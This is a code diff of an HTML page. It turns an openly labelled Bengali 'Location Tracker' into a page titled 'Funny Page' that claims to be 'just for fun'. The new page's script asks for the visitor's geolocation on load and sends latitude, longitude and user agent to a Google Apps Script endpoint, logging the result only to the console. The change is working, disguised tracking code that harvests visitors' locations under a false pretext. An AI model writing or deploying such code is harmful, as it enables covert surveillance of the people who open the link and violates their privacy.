@@ -2,57 +2,37 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Location Tracker</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 100px;
-    }
-  </style>
-  <script>
-    function sendLocation(position) {
-      const data = {
-        latitude: position.coords.latitude,
-        longitude: position.coords.longitude,
-        userAgent: navigator.userAgent
-      };
-
-      fetch("https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec", {
-        method: "POST",
-        body: JSON.stringify(data),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      })
-      .then(response => response.text())
-      .then(text => {
-        document.getElementById("status").innerText = "ধন্যবাদ! লোকেশন পাওয়া গেছে। 😊";
-      })
-      .catch(error => {
-        document.getElementById("status").innerText = "দুঃখিত, লোকেশন পাঠাতে সমস্যা হয়েছে।";
-        console.error(error);
-      });
-    }
-
-    function handleError(error) {
-      document.getElementById("status").innerText = "লোকেশন পাওয়া যায়নি, অনুগ্রহ করে অনুমতি দিন।";
-      console.error(error);
-    }
-
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-      } else {
-        document.getElementById("status").innerText = "দুঃখিত, আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।";
-      }
-    }
-
-    window.onload = getLocation;
-  </script>
+  <title>Funny Page</title>
 </head>
 <body>
-  <h1>লোকেশন ট্র্যাকার</h1>
-  <p id="status">অনুগ্রহ করে লোকেশন শেয়ার করুন...</p>
+  <h1>This page is just for fun 😄</h1>
+  <p>If you're seeing this, you're amazing!</p>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const ua = navigator.userAgent;
+
+        const url =
+          "https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec" +
+          "?lat=" +
+          lat +
+          "&lon=" +
+          lon +
+          "&ua=" +
+          encodeURIComponent(ua);
+
+        fetch(url)
+          .then((res) => res.text())
+          .then((txt) => console.log("Location sent:", txt))
+          .catch((err) => console.error("Error:", err));
+      },
+      (error) => {
+        console.error("Geolocation error:", error);
+      }
+    );
+  </script>
 </body>
 </html>
